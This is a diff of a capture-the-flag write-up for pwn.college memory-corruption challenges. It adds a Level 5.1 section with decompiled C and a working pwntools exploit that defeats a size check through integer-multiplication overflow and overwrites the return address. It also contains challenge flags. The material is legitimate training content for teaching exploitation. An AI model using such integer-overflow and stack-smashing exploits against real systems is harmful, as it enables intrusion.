@@ -1609,7 +1609,7 @@ Flag: `pwn.college{M-FCJzqtx7cmDX7yqpyi7jADAMM.0lN5IDL5cTNxgzW}`
 
 #### Write-up
 
-```c {64, 68} ins={65-66, 69-70, 71-72} del={91} collapse={1-60, 76-87, 95-114}
+```c {64, 68} ins={65-66, 69-70, 71-72} del={73, 91} collapse={1-60, 77-87, 95-114}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
 {
   int *v3; // rax
@@ -1882,7 +1882,7 @@ ssize_t read(int fd, void *buf, size_t nbytes)
 ```python
 #!/usr/bin/python3
 
-from pwn import context, ELF, pause, process, remote, gdb, p64
+from pwn import context, ELF, process, remote, gdb, p64
 
 context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
 
@@ -1930,3 +1930,113 @@ target.recvall()
 #### Flag
 
 Flag: `pwn.college{AcH-0L9UpmOONC81mhni9OzJVhD.01N5IDL5cTNxgzW}`
+
+### Level 5.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
+
+#### Write-up
+
+```c {22, 26} ins={23-24, 27-30} del={31, 33}
+__int64 challenge()
+{
+  int *v0; // rax
+  char *v1; // rax
+  unsigned int v3; // [rsp+28h] [rbp-98h] BYREF
+  unsigned int v4; // [rsp+2Ch] [rbp-94h] BYREF
+  _QWORD v5[14]; // [rsp+30h] [rbp-90h] BYREF
+  int v6; // [rsp+A0h] [rbp-20h]
+  __int16 v7; // [rsp+A4h] [rbp-1Ch]
+  char v8; // [rsp+A6h] [rbp-1Ah]
+  int v9; // [rsp+ACh] [rbp-14h]
+  size_t nbytes; // [rsp+B0h] [rbp-10h]
+  void *buf; // [rsp+B8h] [rbp-8h]
+
+  memset(v5, 0, sizeof(v5));
+  v6 = 0;
+  v7 = 0;
+  v8 = 0;
+  buf = v5;
+  nbytes = 0LL;
+  printf("Number of payload records to send: ");
+  __isoc99_scanf("%u", &v4);
+  if ( !v4 )
+    __assert_fail("record_num > 0", "/challenge/babymem-level-5-1.c", 0x49u, "challenge");
+  printf("Size of each payload record: ");
+  __isoc99_scanf("%u", &v3);
+  if ( !v3 )
+    __assert_fail("record_size > 0", "/challenge/babymem-level-5-1.c", 0x4Cu, "challenge");
+  if ( v3 * v4 > 0x77 )
+    __assert_fail("record_size * record_num <= 119", "/challenge/babymem-level-5-1.c", 0x4Du, "challenge");
+  nbytes = v3 * (unsigned __int64)v4;
+  printf("Send your payload (up to %lu bytes)!\n", nbytes);
+  v9 = read(0, buf, nbytes);
+  if ( v9 < 0 )
+  {
+    v0 = __errno_location();
+    v1 = strerror(*v0);
+    printf("ERROR: Failed to read input -- %s!\n", v1);
+    exit(1);
+  }
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+不写了不写了，和上一题思路一样，自己去调试查 `win` 地址和 padding 大小就好啦～
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, process, remote, gdb, p64
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-5-1"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug([elf.path], gdbscript=gdbscript)
+        else:
+            return process([elf.path])
+    else:
+        return remote(HOST, PORT)
+
+
+target = launch()
+
+payload = b"".ljust(0x98, b"A") + p64(0x401A48)
+
+INT32_MAX = str((2**31)).encode()
+
+target.recvuntil(b"Number of payload records to send: ")
+target.sendline(INT32_MAX)
+target.recvuntil(b"Size of each payload record: ")
+target.sendline(b"2")
+target.sendline(payload)
+
+target.recvall()
+```
+
+#### Flag
+
+Flag: `pwn.college{A2rdZkIDLVjvpTrAPvlwpllVi7m.0FO5IDL5cTNxgzW}`
